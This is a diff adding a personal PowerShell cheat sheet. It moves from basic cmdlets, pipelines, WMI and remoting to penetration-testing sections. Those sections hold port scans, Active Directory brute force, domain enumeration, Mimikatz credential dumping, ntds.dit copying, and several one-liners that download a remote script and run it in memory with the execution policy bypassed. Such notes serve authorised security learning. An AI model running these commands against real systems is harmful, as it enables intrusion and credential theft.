@@ -1,0 +1,275 @@
+## Loading Modules in memory
+. \Script.ps1 // Loads a script in memory using dot sourcing
+Import-Module .\Script.ps1 // Loads a script in memory using Import
+
+## Aliases
+Get-Alias / alias ## Aliases that have been set can seen through this
+New-Alias -Name d -Value Get-ChildItem
+Get-Location -> pwd
+Get-ChildItem -> ls,dir
+Clear-Host -> cls,clear
+Ger-Process -> ps,gps
+
+## Getting Help for commands
+update-help // needs to be run for the first time when Powershell is run first time
+Get-Command -Name *service* //Retrieves commands which has service/Service in it
+Get-Command -Name *service* -CommandType function,cmdlet //filters the results
+Get-Command -Verb stop -noun proc* // retrieves cmds according to nound and verb Ex.Stop-Process
+Get-Help -Name dir // retrieves manual page for 'Get-ChildItem' / 'dir' alias command
+help *serivce* // short way of getting help with piped to more
+help Get-EventLog -Examples // Shows a few usage examples of the command
+help dir -ShowWindow
+
+## Checking Event Logs ##
+Get-EventLog -LogName Security // Will print Security event logs
+Get-EventLog -LogName security -Newest 5 // prints last 5 logs
+
+## Running Commands
+Get-Process -Name conhost // Fetches the process with the name "conhost"
+Get-Process conhost // fetches the process with the name "conhost"
+Get-Process -id 1316 // fetches the process with the id 1316
+
+# PSDrives & PSProviders
+Get-PSDrive / Get-PSProviders //shows drives that are mapped to registry, certs, etc
+New-PSDrive -Name WIN -PSProvider filesystem -Root C:\Winodows // maps the dir to a name
+Get-ItemProperty -Path C:\Users\Amin\Documents\test.txt | select * // shows all properties
+
+# Variables, Strings, HashTables, and Operators
+$name = 'Amin' // assigns the value 'Amin' to variable 'name'
+dir variable: // all variables are stored in the variable drive
+new-variable -name $var -value 'nothing' // another way to set a variable but derefernces $var
+$a = "My name is $name" // $name will be dereferenced under ""
+$b = 'My name is $name" // $name will not be dereferenced under ''
+$a = "My name is `$name" // $name will not be dereferenced because of backtick
+$concatenate = $a + $b // strings can be concatenated with '+'
+$input = read-host "Please enter a number" // Asks for your input
+[int]$input = read-host "Please enter a number" //forces to enter number
+[string]$input = read-host "Please enter a string" // converts everything to string
+$hashtable = @{'key'='value';'name'='amin'} // hashtable or kind of an associative array
+
+# Regular Expression Basics
+"abcd12345" -match "\d+" //matches 12345 inside the $matches variable
+"abcd 12345 test" -replace "\s","-" // replaces according to regex
+Get-ChildItem - Recurse -Include *.log | select-string -Pattern "\s(\d{1,3})\." // works like grep
+
+# Running External Commands
+icacls --% C:\logs\* /grant Administrator:(D:WDAC) // '--%' tells pwsh to not interpret anything
+
+# Exit Return Status
+$LASTEXITCODE // returns the exit code status from the last command
+
+# Piplelin Exporting and Coverting Data
+Get-Process | Export-Csv -Path C:\procs.csv // Exports output in csv format
+Get-Content .\procs.csv // Shows the contents of procs.csv
+Import-Csv -Path C:\procs.csv // Imports and parses the file and shows in pwsh
+Get-Process | ConvertTo-Csv // Converts output in CSV format
+Get-Process | ConvertTo-Csv | out-file procs.csv // Alternate method for creating csv
+Get-Service | export-clixml C:\services.xml // stores in the xml format
+Compare-Object -ReferenceObject (Import-Clixml .\baseline.xml) -DifferenceObject (Get-Process) -Property name
+
+# Objects in PowerShell
+Get-Service | gm // gm tells you what kind of data structure is piped and objects
+echo 'hello' | gm // tells you the type of piped data and objects
+'hello'.length // tells you the length of the string
+'hello'.ToUpper()
+'hello'.Replace('e', 'a')
+$d = Get-Date() // gets system date
+$d.hour , $d.dayofweek, $d.ticks
+$d | gm // to get objects and functions for date
+get-command -noun object
+
+# Core Commands
+Get-Process | Sort-Object ws -Descending | Select-Object -first 5 // sorts and selects first 5
+Get-Process | Sort ws | Select -last 5 // sorts and selects last 5
+Get-Process | sort ws | select -first 5 -Property name,cpu,ws // sorts and select first 5 props
+Get-Service | Group status // groups according to status
+Get-Process | Measure -Property ws -min -max -ave -sum // measures according to ws in min,max,ave,sum
+Get-Process | sort ws -desc | select -frst 5 | measure -Property ws -sum -ave | out-file results.txt
+Get-Process | select -Property name,@{name='vm(mb)';e={$_.VM / 1MB as [int]}},id,pm // custom column
+
+# Comparison Operators and Filtering
+5 -eq 5 // returns true
+5 -lt 6 // returns true
+5 -gt 6 // returns false
+6 -ne 5 // returns true
+'hello' -eq 'hello' //returns true
+'hello' -ceq 'Hello' //returns false
+'hello' -ne 'hello' //returns false
+'hello' -Like '*e*' //returns true
+Get-Service | Where-Object -FilterScript { $_.status -eq 'Running' -and $_.name -like 's*'} // filters based on running and staring with 's'
+Get-Service | Where-Object -FilterScript { $_.status -eq 'Running' -or $_.name -like 's*' } // filters based on running or 's'
+
+# Advanced Operators
+$x = 'hello' //
+$x -is [string] // returns true
+$x -is [int] // returns false
+$x -isnot [string] // returns false
+$x -like '*ll*' // returns true
+$x -contains 'hell' //returns false because it is not an array and it is not separate
+$x -replace 'l','e' //replaces l with e
+
+# Arrays
+$x = 1,2,3,4,5,6,'one','two','three','four','five','six' // definines an array
+$x += 'seven' //adds more elements to array
+$x -join ',' //joins the array with ',' : 1,2,3,4,5,6,one
+$x -split ',' //splits the string and converts to array
+$x = ,1 // defines a single item array
+
+# Setting default values for parameters
+$PSDefaultParameterValues // shows the parameter values set by us
+$PSDefaultParameterValues = @ { "Get-EventLog:Newest"=10 } // sets the default value for newest parameter of get-eventlog
+$PSDefaultParameterValues.add("Get-EventLog:LogName", "Application") //adds to the existing default values for params set by us
+
+# Enumerating Objects in the Pipeline
+Get-Process -Name notepad | Foreach-Object -Process { $_.kill() } // kills all processes named notepad one by one
+Get-Process -Name notepad | foreach { $_.kill() } // kills all processes named notepad one by one
+
+# PowerShell Remoting // It used WSMAN(WINRM) protocol to work
+Enable-PSRemoting // Enables PowerShell Remoting
+Enter-PSSession -ComputerName Win7-Client // Invokes remoting to the other machine and brings shell
+Invoke-Command -ScriptBlock { Get-EventLog -LogName Security -Newest 10 } -ComputerName Win7-Client // Executes commands on the remote powershell
+$sess = New-PSSession -ComputerName Win7-Client // creates a persistent session to use
+Invoke-Command -ScriptBlock { Get-Process } -Session $sess // Executes the command through the session
+Enter-PSSession -Session $sess // Enters into powershell through session
+$sess | Remove-PSSession //removes the session
+
+# WMI
+Get-WmiObject -List // retreives all WMI objects
+Get-WmiObject -List | where { $_.name -like '*disk*' } // retrieves WMI objects for disk related stuff
+gwmi win32_service | select * -first 1 // grabs first row from the output of wmi
+Get-WmiObject -ClassName Win32_Service -ComputerName Main-DC-2012 -Filter "State != 'Running' AND StartMode = 'Auto'"
+Invoke-WmiMethod -Class Win32_Process -Namespace root/cimv2 -Name Create -ArgumentList "cmd.exe" //Starts process through wmi
+
+# WMI WQL
+$wql = "Select * from Win32_service WHERE State != 'Running' AND StartMode = 'Auto'
+Get-WmiObject -Query $wql
+
+# CIM
+Get-CimClass -ClassName win32_bios // retrieves win32_bios class from cim
+Get-CimClass -ClassName win32_bios | select -ExpandProperty cimclassproperties // expands the inner objects
+Get-CimInstance -NameSpace root/SecurityCenter2 -ClassName AntiSpywareProduct | select * // shows installed antispyware products 
+Get-CimInstance -ClassName win32_service -Filter "State != 'Running' AND StartMode = 'Auto'"
+Get-CimInstance -Query "SELECT * FROM Win32_Service WHERE StartMode = 'auto AND name LIKE 'remote%'"
+
+# COM
+Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -include PROGID -Recurse | foreach {$_.GetValue("")} | Where {$_ -match "Internet Explorer"} // Search for Com object
+$wscript = New-Object -ComObject WScript.Shell.1
+$wscript.Exec("notepad.exe")
+$wscript.popup("hello") 
+$iexplore = New-Object -ComObject InternetExplorer.Application.1
+$iexplore.Visible = $False
+$iexplore.Navigate2("http://192.168.40.157/", 0, 0, 0, 0)
+$shell = New-Object -ComObject Shell.Application
+$shell.MinimizeAll()
+
+# Background Job Basics (Local & Remoting)
+Get-Command -noun job
+Start-Job -ScriptBlock { sleep 20 } // starts a background job with powershell
+Get-Job // gets the status of all jobs running,stopped,failed
+Stop-Job -id 2 //stops the job if running
+Get-Job | Stop-Job // removes all jobs
+receive-job -id 2 // retrieves the output of the background job
+
+# Script Execution Policy
+powershell -ExecutionPolicy bypass // allows script execution through all means
+Set-ExecutionPolicy bypass // changes policy inside the powershell shell
+Get-ExecutionPolicy // retrieves the current policy
+
+# Prompting for Input Producing Output
+Get-Command -verb write // shows all write commands
+Write-Host "This is displaying on Screen" -ForegroundColor Red -BackgroundColor White // displays text in any case on the screen
+Write-Output "This is displaying" | where { $_.length -gt 10 }
+Read-Host "Enter Something" // Prompts for input
+$input = Read-Host "Enter Something" // Prompts for input and stores into $input variable
+$VerbosePreference = 'Continue' // turns on verbose output
+Write-Verbose "Hi"
+$VerbosePreference = 'SilentlyContinue' // tunrs off verbose output
+
+# Functions
+dir function: //shows currently loaded functions
+$env:PSModulePath //shows module path loaded in the environment
+
+# Using .Net Classes
+// Static
+[System.Math]::PI //shows the value of PI using .net framework
+[System.Math]::Abs(-10) //shows absolute value of -10
+[System.Net.Dns]::GetHostEntry('www.google.com') // shows A record
+// Instances
+$web = [System.Net.WebRequest]::Create('http://haiderm.com') // creates a web request to a web url
+
+# Profiles
+$profile // holds the path to the profile script
+
+#Tips & Tricks
+Get-Content doesnotexist.txt 2> output.txt // sends error pipeline output to file
+Get-Content doesnotexist.txt *> output.txt // sends all pipelines output to file
+Get-Content doesnotexist.txt,file.txt 2>&1 | out-file combined.txt
+$$ // contains the last token from the previous command like Alt . in linux
+$^ // contains the first token from the previous command
+1..100 // generates a sequence from 1 to 100
+1..100 | Measure-Object // measures the count (number of lines)
+"Welcome to Powershell for Penetration Testers" -split " " // splits based on a delimeter
+(3).GetType() // gets the type of the variable or the input
+Get-ChildItem | Where-Object { $_.Name -match "csv" } // shows files having 'csv' in them
+(Get-Process).Path // gives the location of the executable of the process
+Get-Process | Select-Object -Property @{n='Process';e={$_.Name}},@{n='Path';e={$_.Path}}
+Get-Command -CommandType cmdlet -ParameterName ComputerName // finds all cmdlets which take "ComputerName" parameter
+
+# Common PowerShell Commands
+Get-PSDrive // Shows all the drives {FileSystem,Variable,Function,WSMan,Registry)
+Get-PSDrive -PSProvider FileSystem // shows only filesystem drives
+Get-ChildItem // shows the current directory files and directories
+
+
+# Working with .Net
+[System.AppDomain]::CurrentDomain.GetAssemblies() //shows the current loaded .net assemblies/classes
+[System.AppDomain]::CurrentDomain.GetAssemblies().GetTypes() //shows the
+
+
+# Port Scan with PowerShell
+Import-Module nishang\nighsang.psm1
+Invoke-PortScan -StartAddress 192.168.40.1 -EndAddress 192.168.40.254 -ResolveHost // finds systems on the network
+Invoke-PortScan -StartAddress 192.168.40.131 -EndAddress 192.168.40.131 -ScanPort // scans port for a single IP
+Import-Module PowerSploit\PowerSploit.psd1
+Invoke-PortScan -Hosts 192.168.40.1/24 -PingOnly // Discovers systems in the given range
+Invoke-PortScan -Hosts 192.168.40.131 -TopPorts 50 // scans Top 50 ports of a single host
+Import-Module Posh-SecMod\Post-SecMod.psd1 
+Invoke-ARPScan -CIDR 192.168.40.1/24 // runs arp scan to discover hosts
+
+# Enumeration with PowerShell
+Import-Module PowerSploit\PowerSploit.psd1
+Get-HttpStatus -Target 192.168.1.227 -Path .\PowerSploit\Recon\Dictionaries\Generic.txt -Port 8080 //directory brutes
+
+# Brute Force with PowerShell
+Import-Module nishang\nishang.psm1
+Invoke-BruteForce -ComputerName Main-DC-2012 -UserList C:\user.txt -PassList C:\pass.txt -Service ActiveDirectory -Verbose //brutes AD users
+
+# Downloading and executing with PowerShell
+(New-Object Net.WebClient).DownloadFile('http://IP/test.ps1', 'C:\test.ps1') // downloads file on the disk
+Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://ip/script.ps1')) // Invokes script in memory current pwsh session by downloading it
+iex ((New-Object Net.WebClient).DownloadString('http://ip/script.ps1')) // short way of running the above command
+powershell.exe -ExecutionPolicy bypass -noprofile -WindowStyle hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://ip/script.ps1')) // better way to run
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://ip/script.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+iex (iwr 'http://ip/script.ps1')
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET', 'http://ip/script.ps1', $false);$h.send();iex $h.responseText
+$wr = [System.Net.WebRequest]::Create('http://ip/script.ps1');$r=$wr.GetResponse();IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+
+# Domain Enumeration with PowerShell
+Import-Module PowerSploit\PowerSploit.psd1
+Get-Command -Module PowerSploit // shows all the commands from the PowerSploit module
+Get-NetDomain //shows the information about domain controller
+Get-NetUser | select samaccountname //shows all the users of a domain
+Get-NetComputer // Shows all the computers/servers connected to domain
+Get-NetGroup //shows all the groups in a domain
+Get-NetLoggedon //shows logged in users on domain systems
+Get-ExploitableSystem // shows possible vulnerable systems on the domain
+Invoke-UserHunter // shows systems where domain admin is logged on
+Invoke-UserHunter -UserName amin //shows a specific user where it is logged in
+Invoke-ShareFinder // finds shares across domain
+Invoke-FileFinder // finds sensitive files on the system it is run on
+Invoke-TokenManipulation -CreateProcess "cmd.exe" -UserName "nt authority\system" // obtaining system after DA/local admin to better extract memory
+Invoke-Mimikatz -DumpCreds // dumps plain secrets without touching disk
+Invoke-Mimikatz -DumpCerts // dumps certificates
+Invoke-Mimikatz -ComputerName Main-DC-2012 //dumps secrets remotely
+Invoke-NinjaCopy -Path "C:\Windows\NTDS\ndts.dit" -RemoteDestination "C:\Windows\Temp\ntds.dit" -ComputerName "Main-DC-2012" // copies ntds to remote
+Invoke-NinjaCopy -Path "C:\Windows\NTDS\ndts.dit" -LocalDestination "C:\Tools\ntds.dit" -ComputerName "Main-DC-2012" // copies ntds to local
